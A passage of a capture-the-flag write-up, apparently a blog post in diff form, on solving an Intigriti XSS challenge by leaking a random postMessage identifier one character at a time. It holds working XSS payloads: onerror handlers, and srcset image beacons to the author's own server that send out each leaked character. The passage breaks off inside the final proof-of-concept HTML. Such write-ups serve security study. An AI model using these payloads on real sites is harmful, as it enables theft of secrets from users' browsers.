+<li>If all of the above are successful, it is safe and will be interpreted as innerHTML by index.html.</li>
+</ol>
+<p>Combining the above conditions, if I pass <code>error=123</code>, the screen will display 123. If I pass <code>&lt;h1&gt;hello&lt;/h1&gt;</code>, the screen will actually display a heading with the word “hello”, but if I pass <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, the screen will only display the text and will not execute it as HTML because <code>safe</code> is false.</p>
+<p>That’s basically the introduction to the challenge. I highly recommend that you try it out for yourself first, at least for an hour or two, before reading this article, as you will gain a lot more from it.</p>
+<p>Below is my train of thought in solving the challenge, and I will write it according to the timeline of my solution.</p>
+<h2><span id="first-attempt">First Attempt</span></h2><p>As can be seen from the title, there are two ways to successfully execute XSS:</p>
+<ol>
+<li>Bypass the restrictions using various tricks and execute XSS directly on the page.</li>
+<li>Use <code>window.open</code> to open this page and then postMessage, forge messages and make safe true, so that any HTML can be inserted.</li>
+</ol>
+<p>At first, I thought about the first method because for the second method, you need to know what the identifier is, but since it is random, it is impossible. I thought it was a dead end.</p>
+<p>So the next step is to think about how to bypass the restrictions.</p>
+<p>From the filtered tags, I found that my favorite <code>&lt;img&gt;</code> was not filtered out, and the onXX event handler was only restricted in content and was not filtered out together, so you can use: <code>&lt;img src=x onerror=123&gt;</code> to execute JS.</p>
+<p>But the problem is that there are too many characters that cannot be used, <code>()</code> cannot be used, so functions cannot be called, and using backticks &#96; to call is not possible either. So how can we execute alert? I was stuck here for a long time, and finally went to Google: “js call function without parentheses” and found this article: <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/35949554/invoking-a-function-without-parentheses/35949617">js call function without parentheses</a>, which mentioned many tricks that I had never thought of.</p>
+<p>For example, using the object’s valueOf with +, or using new with constructor, or the most amazing one is onerror&#x3D;eval with throw. These are all super cool techniques to bypass restrictions without using <code>()</code>.</p>
+<p>But none of the above worked because the restrictions were too strict. The object’s <code>&#123;&#125;</code> cannot be used, and new cannot be used because it requires a space. The reason why there cannot be a space is because <code>&lt;img onerror=new abc&gt;</code> will be interpreted as: <code>&lt;img onerror=&quot;new&quot; abc&gt;</code>. If you want them to be put together in onerror, you can only use <code>&quot;</code> to enclose them, but <code>&quot;</code> is a restricted character that cannot be used, so there cannot be spaces in onerror.</p>
+<p>Throw seemed to have a chance, but <code>onerror=eval</code>, which is a prerequisite for execution, has an equal sign, so it cannot be used.</p>
+<p>At this point, I thought, what if I HTML entity encode the restricted characters? Change <code>=</code> to <code>&amp;#61;</code> to bypass the restrictions.</p>
+<p>After trying it out, I found that it didn’t work because it had been restored to characters in the first step <code>decodeHTMLEntities(str)</code>. At this point, I had two ideas:</p>
+<ol>
+<li>Can decoding HTML entities inside textarea cause XSS?</li>
+<li>Can double encoding be used?</li>
+</ol>
+<p>The first approach is not feasible because although there is <code>ta.innerHTML = str;</code>, this element has never been placed on the DOM, so it is useless.</p>
+<p>The second approach is also not feasible because the final <code>&amp;#61;</code> will only be treated as text to display.</p>
+<p>After trying for a long time, I couldn’t come up with anything. The only code that can be executed successfully is <code>&lt;img src=x onerror=throw/0/+identifier&gt;</code>, which throws the identifier as an error message and then nothing happens. But this can’t do anything.</p>
+<h2><span id="hints">Hints</span></h2><p>For every 100 likes received, a hint will be released. Due to the difficulty of the challenge, there are also additional hints. The hints I saw were:</p>
+<ol>
+<li>First hint: find the objective! (4&#x2F;19 21:57)</li>
+<li>Time for another hint! Where to smuggle data? (4&#x2F;20 00:24)</li>
+<li>Time for another tip! One bite after another! (4&#x2F;20 19:55)</li>
+</ol>
+<p>To be honest, I didn’t understand these hints very well. The one I understood the most was the third one, which should mean “One Byte after another”. Looking back at the XS-Leaks mentioned earlier, I thought, “Damn, could it be that the dead end I thought was the right solution?”.</p>
+<p>The dead end I mentioned earlier is “forging messages by postMessage from elsewhere”, but I need to know what the randomly generated identifier is to succeed. If this is the right approach, the process to be solved should be:</p>
+<ol>
+<li>Open a web page and use window.open to open the XSS challenge.</li>
+<li>Find a way to get the identifier.</li>
+<li>Post the message to yourself from this web page and insert any HTML.</li>
+</ol>
+<p>As long as the second step is successful, the whole process can be connected. But the problem is, how do I know what the identifier is? Since the hint says “one byte after another”, I guess it should leak out one character at a time, so I can start thinking from one character.</p>
+<p>At this point, I thought of this: <code>&lt;img src=x onerror=identifier&lt;&#39;1&#39;?is_zero:keep_trying&gt;</code>. We can use the ternary operator with <code>&lt;</code> to determine the first character of the identifier. Although we cannot use strings, <code>&#39;1&#39;</code> can be replaced with <code>&lt;div id=n1&gt;1&lt;/div&gt;</code> + <code>n1.innerText</code> to avoid single and double quotes. And the ternary operator can be nested indefinitely, like this:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">identifier<span class="token operator">&lt;</span><span class="token string">'1'</span><span class="token operator">?</span>is_zero<span class="token operator">:</span>
+identifier<span class="token operator">&lt;</span><span class="token string">'2'</span><span class="token operator">?</span>is_one<span class="token operator">:</span>
+identifier<span class="token operator">&lt;</span><span class="token string">'3'</span><span class="token operator">?</span>is_two<span class="token operator">:</span>
+identifier<span class="token operator">&lt;</span><span class="token string">'4'</span><span class="token operator">?</span>is_three<span class="token operator">:</span>
+<span class="token operator">...</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>So we can indeed use this method to find out what the first character of the identifier is. But the problem is, once we know it, how do we pass this information out?</p>
+<p>We cannot call functions, and we cannot even assign values. So how do we pass information out? If we could use <code>=</code>, we could change <code>window.opener.location</code> with something like <code>window.opener.location = xxx+1</code>, or use <code>&lt;img id=a src=x&gt;</code> with <code>a.src=xxxx</code> to load a new image, so that I can know from the server side what character was leaked.</p>
+<p>But because we cannot use the equal sign, we cannot do any of these things.</p>
+<p>At this point, I was stuck again, and for a long time. I couldn’t think of how to pass the information out. Then I got the next hint:</p>
+<ol>
+<li>Here’s an extra tip: ++ is also an assignment (4&#x2F;20 22:17)</li>
+</ol>
+<p>When I first saw this hint, I thought it might be useful, but I didn’t know how to use it. <code>++</code> can also change values, but what’s the use? I initially thought about going in the direction of <code>window.opener</code>, are there any properties that can be manipulated, such as <code>window.opener.name++</code>? Or are there any other properties that can be manipulated?</p>
+<p>If I could change a property of a <code>window.opener</code>, I could somehow pass the leaked information back. But I searched for a long time and even looked at the spec, and it seems that there is no such thing. <code>window.opener.location</code> can be changed, but <code>++</code> cannot be used, because <code>++</code> is like <code>window.opener.location = window.opener.location + 1</code>, and if executed, it will throw an error because it involves reading:</p>
+<pre class="line-numbers language-none"><code class="language-none">VM82:1 Uncaught DOMException: Blocked a frame with origin &quot;https:&#x2F;&#x2F;challenge-0421.intigriti.io&quot; from accessing a cross-origin frame.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>Then I remembered a trick I learned somewhere, using image loading.</p>
+<p>For example, if you make an image not load, and then use <code>++</code> to change the CSS or other properties to make it load, then I can know this information from the server.</p>
+<p>I tried this:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>n0</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>//server/n0</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">opacity</span><span class="token punctuation">:</span>0<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>
+&lt;img src=x onerror=identifier<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">'1'?n0.style.opacity++:</span>...</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>But the image would still load even if the opacity was 0, so it didn’t work. Later, I tried several other properties and remembered one I had used recently: <code>loading</code>.</p>
+<p>In the past, if you wanted to lazy load images, you would often use a plugin, and earlier you needed to detect scrolling, but recently you can use <code>IntersectionObserver</code>. And more recently, many browsers support native lazy loading: <code>&lt;img src=x loding=&quot;lazy&quot;&gt;</code>, and if the image is not too far from the visible area, it will not be loaded.</p>
+<p>So we can do this:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">height</span><span class="token punctuation">:</span> 9999px</span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>n0</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>//server/n0</span> <span class="token attr-name">loading</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lazy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+&lt;img src=x onerror=identifier<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">'1'?n0.loading++:</span>...</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>First, use a very high div to push the image down, outside the threshold, and then when we confirm that the first character is 0, we increase the loading of <code>n0</code>, which will become NaN after <code>++</code>, and because loading does not have NaN as a value, it will fallback to the default auto and load the image.</p>
+<p>Assuming <code>server/n0</code> is my own server, then I receive the n0 request, which means the first character is 0. With this idea, we can indeed know what the first character is, like this:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">height</span><span class="token punctuation">:</span> 9999px</span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>n0</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>//server/n0</span> <span class="token attr-name">loading</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lazy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>n1</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>//server/n1</span> <span class="token attr-name">loading</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lazy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>n2</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>//server/n2</span> <span class="token attr-name">loading</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lazy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+&lt;img src=x onerror=
+identifier<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">'1'?n0.loading++:</span></span>
+<span class="token attr-name"><span class="token namespace">identifier&lt;'2'?n1.loading++:</span></span>
+<span class="token attr-name"><span class="token namespace">identifier&lt;'3'?n2.loading++:</span></span>
+<span class="token attr-name">...</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>We have the first character! But what about the second one?</p>
+<p>We cannot use <code>identifier[1]</code> because we cannot use brackets. I thought about all kinds of possibilities and felt that this was a dead end. It was impossible to get the nth character without using <code>[]()&#123;&#125;</code>.</p>
+<h2><span id="solving-the-weakened-version">Solving the weakened version?</span></h2><p>Although I felt that it was impossible to get the nth character and was stuck in the problem, I had a bold idea.</p>
+<p>I cannot get the nth character of a string, but what about a number? Can I get it through a series of mathematical operations? For example, to get 2 from 123, it would be something like 123&#x2F;10%10 (although it will come out as a decimal). Or directly using binary, <code>num&amp;1</code> can tell you the last bit of num, <code>num&amp;2</code> can tell you the second to last bit, and so on, so you can know what each bit is.</p>
+<p>However, the identifier is not a number, so what should we do? Find a way to convert it to a number! If the identifier only contains 0-9a-z, we can add <code>0x</code> in front of it and convert it to a number using <code>+</code>. Finally, it will look like this:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>body<span class="token operator">></span>
+  <span class="token operator">&lt;</span>div style<span class="token operator">=</span>height<span class="token operator">:</span>9999px id<span class="token operator">=</span>a<span class="token operator">></span>0x<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
+  <span class="token operator">&lt;</span>img src<span class="token operator">=</span>https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>example<span class="token punctuation">.</span>com<span class="token operator">/</span>x00 id<span class="token operator">=</span>x00 loading<span class="token operator">=</span>lazy<span class="token operator">></span>
+  <span class="token operator">&lt;</span>img src<span class="token operator">=</span>https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>example<span class="token punctuation">.</span>com<span class="token operator">/</span>x01 id<span class="token operator">=</span>x01 loading<span class="token operator">=</span>lazy<span class="token operator">></span>
+  <span class="token operator">&lt;</span>img src<span class="token operator">=</span>https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>example<span class="token punctuation">.</span>com<span class="token operator">/</span>x10 id<span class="token operator">=</span>x10 loading<span class="token operator">=</span>lazy<span class="token operator">></span>
+  <span class="token operator">&lt;</span>img src<span class="token operator">=</span>https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>example<span class="token punctuation">.</span>com<span class="token operator">/</span>x11 id<span class="token operator">=</span>x11 loading<span class="token operator">=</span>lazy<span class="token operator">></span>
+  <span class="token operator">&lt;</span>img src<span class="token operator">=</span>https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>example<span class="token punctuation">.</span>com<span class="token operator">/</span>x20 id<span class="token operator">=</span>x20 loading<span class="token operator">=</span>lazy<span class="token operator">></span>
+  <span class="token operator">&lt;</span>img src<span class="token operator">=</span>https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>example<span class="token punctuation">.</span>com<span class="token operator">/</span>x21 id<span class="token operator">=</span>x21 loading<span class="token operator">=</span>lazy<span class="token operator">></span>
+  <span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onerror<span class="token operator">=</span>
+a<span class="token punctuation">.</span>innerText<span class="token operator">+</span>identifier<span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">?</span>x01<span class="token punctuation">.</span>loading<span class="token operator">++</span><span class="token operator">:</span>x00<span class="token punctuation">.</span>loading<span class="token operator">++</span><span class="token punctuation">;</span>
+a<span class="token punctuation">.</span>innerText<span class="token operator">+</span>identifier<span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">?</span>x11<span class="token punctuation">.</span>loading<span class="token operator">++</span><span class="token operator">:</span>x10<span class="token punctuation">.</span>loading<span class="token operator">++</span><span class="token punctuation">;</span>
+a<span class="token punctuation">.</span>innerText<span class="token operator">+</span>identifier<span class="token operator">&amp;</span><span class="token number">4</span><span class="token operator">?</span>x21<span class="token punctuation">.</span>loading<span class="token operator">++</span><span class="token operator">:</span>x20<span class="token punctuation">.</span>loading<span class="token operator">++</span> <span class="token operator">></span>
+
+<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span>
+<span class="token operator">&lt;</span>script<span class="token operator">></span>
+  <span class="token keyword">var</span> identifier <span class="token operator">=</span> <span class="token string">'a4'</span> <span class="token comment">// 164</span>
+  <span class="token comment">// 10100100</span>
+  
+<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Note that the operator’s priority must be considered. If the order is not as expected, it may not work properly. For example, <code>+&#39;0x&#39;+identifier</code> will execute <code>+0x</code> first, rather than concatenating the strings. The <code>&amp;</code> operator will try to convert to a number first, which is why it can be used in this way.</p>
+<p>The above POC proves that if we can convert the identifier to a number, we can solve this problem. However, the identifier may contain characters above <code>f</code>, and the probability of being able to convert it to a number is very low, less than 0.01%, and it takes an average of ten thousand attempts to succeed.</p>
+<p>Although this probability is unacceptable, at least I know that the weakened version can be solved.</p>
+<h2><span id="relying-on-hints-again">Relying on Hints Again</span></h2><p>After solving the weakened version, I thought it was almost over. Maybe my direction was wrong, and it was not solved in this way?</p>
+<p>Because I really couldn’t figure out how to get <code>identifier[n]</code>, I thought it was impossible.</p>
+<p>At this point, I saw a new hint:</p>
+<ol>
+<li>“Behind a Greater Oracle there stands one great Identity” (leak it) (4&#x2F;22 15:53)</li>
+<li>Tipping time! Goal &lt; object(ive) (4&#x2F;23 01:58)</li>
+</ol>
+<p>From these two new hints, it was verified that my direction was actually correct, that is, to leak the identifier, and then use the <code>&lt;</code> symbol to compare.</p>
+<p>So I should only be one or two steps away from solving it, and I’m almost there. But these last two steps are really difficult.</p>
+<p>Although I wanted to give up, after a day, I had a new idea: “I don’t really need to get the second character separately! Assuming I have a place to store the first character, then I only need <code>identifier &lt; str + &#39;1&#39;</code>, right?”</p>
+<p>If there is a place to store the found character, then a loop-like concept can be used to run and leak all the characters.</p>
+<p>Where would this place be? This place needs to be passed from the opener because only the opener knows what character is leaked now. But because of cross-origin issues, there is no attribute that can be accessed by the opener.</p>
+<p>After trying for about an hour or two, I suddenly thought of reversing it. Instead of getting something from the opener, the opener passes something to the open window. How to pass it? It can be done through <code>location.hash</code>!</p>
+<p>After opening the XSS challenge with <code>window.open</code> in our webpage, we can use <code>win.location = url + &#39;#a&#39;</code> to add a hash without reloading the webpage. After adding it, it can be accessed in the webpage using <code>location.hash</code>. Exchange information between cross-origin windows through <code>location.hash</code>.</p>
+<p>Although I took another step forward, there are still two problems that need to be solved:</p>
+<ol>
+<li>We need something like a loop</li>
+<li>We need to be able to send multiple requests to the server</li>
+</ol>
+<p>Starting with the first problem, we need to execute similar code continuously to leak one character at a time. This is not difficult. We can use <code>this.src++</code> to change the <code>src</code> of the image. Once the <code>src</code> is assigned, even if the value is the same, the image will still be reloaded. For example:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    <span class="token keyword">var</span> count <span class="token operator">=</span> <span class="token number">1</span>
+  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript">count<span class="token operator">&lt;</span><span class="token number">10</span><span class="token operator">?</span>count<span class="token operator">++</span><span class="token operator">&amp;&amp;</span>src<span class="token operator">++</span><span class="token operator">:</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>There is no problem with the loop. Next is the part of leaking information multiple times. The lazy loading we used before can only be used once for an image because once the image is loaded, it is loaded, and there is no way to use <code>img.loading++</code> to load it again. What should we do? We need a channel that allows us to send the correct request at the specified time.</p>
+<p>After trying randomly for a while, I found a magical attribute: <code>srcset</code>, which is magical when used with <code>src</code>.</p>
+<p>When I set <code>src</code> and <code>srcset</code> together, the browser will prioritize loading the URL of <code>srcset</code>. The magical thing is that when I increment <code>src</code>, <code>srcset</code> will be loaded again! Here is an example that loads <code>x2</code> ten times:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>body<span class="token operator">></span>
+  <span class="token operator">&lt;</span>script<span class="token operator">></span>
+    <span class="token keyword">var</span> count <span class="token operator">=</span> <span class="token number">1</span>
+  <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
+  <span class="token operator">&lt;</span>img src<span class="token operator">=</span>x1 srcset<span class="token operator">=</span>x2 onerror<span class="token operator">=</span>count<span class="token operator">&lt;</span><span class="token number">10</span><span class="token operator">?</span>count<span class="token operator">++</span><span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span>src<span class="token operator">++</span><span class="token operator">:</span><span class="token number">123</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Since these two problems have been solved, putting them together can solve the final answer. The process is as follows:</p>
+<ol>
+<li>Open poc.html and window.open XSS challenge</li>
+<li>Error carries our prepared payload</li>
+<li>Use the <code>onerror</code> of the image to execute a nested ternary operator. If the condition is met, load the corresponding image, leak out the nth character, and wait for the next loop to start</li>
+<li>The server receives the image and knows what the nth character is</li>
+<li>The server passes the result to poc.html, and poc.html updates <code>win.location.hash</code></li>
+<li>After the update, the server opens the next loop by returning a response, adding n+1, and returning to step 3</li>
+<li>Repeat the above steps until the token is found</li>
+</ol>
+<p>The ideal process is as follows, but due to time constraints, I didn’t follow it strictly in some places, for example:</p>
+<ol>
+<li>I assumed that the first character of the identifier is <code>1</code>, if not, skip it.</li>
+<li>The server waits for 500ms to start the next loop, but it is possible that the <code>location.hash</code> has not been updated yet.</li>
+<li>The ideal way for the server to send results to <code>poc.html</code> is to use WebSockets, but I took a shortcut and used long polling.</li>
+<li>I was too lazy to check if all the identifiers were fetched, so I started trying to use <code>postMessage</code> when the length was greater than 10.</li>
+</ol>
+<p>The final code looks like this:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> payload <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+&lt;img srcset=//my_server/0 id=n0 alt=#>
+&lt;img srcset=//my_server/1 id=n1 alt=a>
+&lt;img srcset=//my_server/2 id=n2 alt=b>
+&lt;img srcset=//my_server/3 id=n3 alt=c>
+&lt;img srcset=//my_server/4 id=n4 alt=d>
+&lt;img srcset=//my_server/5 id=n5 alt=e>
+&lt;img srcset=//my_server/6 id=n6 alt=f>
+&lt;img srcset=//my_server/7 id=n7 alt=g>
+&lt;img srcset=//my_server/8 id=n8 alt=h>
+&lt;img srcset=//my_server/9 id=n9 alt=i>
+&lt;img srcset=//my_server/a id=n10 alt=j>
+&lt;img srcset=//my_server/b id=n11 alt=k>
+&lt;img srcset=//my_server/c id=n12 alt=l>
+&lt;img srcset=//my_server/d id=n13 alt=m>
+&lt;img srcset=//my_server/e id=n14 alt=n>
+&lt;img srcset=//my_server/f id=n15 alt=o>
+&lt;img srcset=//my_server/g id=n16 alt=p>
+&lt;img srcset=//my_server/h id=n17 alt=q>
+&lt;img srcset=//my_server/i id=n18 alt=r>
+&lt;img srcset=//my_server/j id=n19 alt=s>
+&lt;img srcset=//my_server/k id=n20 alt=t>
+&lt;img srcset=//my_server/l id=n21 alt=u>
+&lt;img srcset=//my_server/m id=n22 alt=v>
+&lt;img srcset=//my_server/n id=n23 alt=w>
+&lt;img srcset=//my_server/o id=n24 alt=x>
+&lt;img srcset=//my_server/p id=n25 alt=y>
+&lt;img srcset=//my_server/q id=n26 alt=z>
+&lt;img srcset=//my_server/r id=n27 alt=0>
+&lt;img srcset=//my_server/s id=n28>
+&lt;img srcset=//my_server/t id=n29>
+&lt;img srcset=//my_server/u id=n30>
+&lt;img srcset=//my_server/v id=n31>
+&lt;img srcset=//my_server/w id=n32>
+&lt;img srcset=//my_server/x id=n33>
+&lt;img srcset=//my_server/y id=n34>
+&lt;img srcset=//my_server/z id=n35>
+
+&lt;img id=lo srcset=//my_server/loop onerror=
+n0.alt+identifier&lt;location.hash+1?n0.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+2?n1.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+3?n2.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+4?n3.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+5?n4.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+6?n5.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+7?n6.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+8?n7.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+9?n8.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+n1.alt?n9.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+n2.alt?n10.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+n3.alt?n11.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+n4.alt?n12.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+n5.alt?n13.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+n6.alt?n14.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+n7.alt?n15.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+n8.alt?n16.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+n9.alt?n17.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+n10.alt?n18.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+n11.alt?n19.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+n12.alt?n20.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+n13.alt?n21.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+n14.alt?n22.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+n15.alt?n23.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+n16.alt?n24.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+n17.alt?n25.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+n18.alt?n26.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+n19.alt?n27.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+n20.alt?n28.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+n21.alt?n29.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+n22.alt?n30.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+n23.alt?n31.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+n24.alt?n32.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+n25.alt?n33.src+++lo.src++:
+n0.alt+identifier&lt;location.hash+n26.alt?n34.src+++lo.src++:
+n35.src+++lo.src++></span><span class="token template-punctuation string">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    <span class="token keyword">var</span> payload <span class="token operator">=</span> <span class="token comment">// see above</span>
